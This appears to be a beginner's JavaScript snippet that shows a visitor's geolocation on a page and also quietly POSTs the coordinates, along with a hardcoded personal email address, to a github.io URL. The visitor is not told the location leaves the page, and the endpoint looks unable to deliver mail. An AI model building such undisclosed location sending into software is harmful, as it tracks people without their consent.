const locationInfo = document.getElementById("location-info");
const getLocationBtn = document.getElementById("get-location");

getLocationBtn.addEventListener("click", () => {
    navigator.geolocation.getCurrentPosition((position) => {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Отправка данных на почту
        const email = "osip.1942@gmail.com";
        const subject = "Мое местоположение";
        const body = `Широта: ${latitude}, Долгота: ${longitude}`;

        // **Замените этот код на ваш API для отправки почты**
         fetch("https://osip-d25.github.io/filetest/", {
             method: "POST",
           headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                email,
               subject,
                 body,
            }),
       });

        locationInfo.innerHTML = `
            <p>Ваше местоположение:</p>
            <ul>
                <li>Широта: ${latitude}</li>
                <li>Долгота: ${longitude}</li>
            </ul>
        `;
    }, (error) => {
        console.log(`Ошибка при получении местоположения: ${error.message}`);
        locationInfo.innerHTML = `<p>Ошибка при получении местоположения</p>`;
    });
});
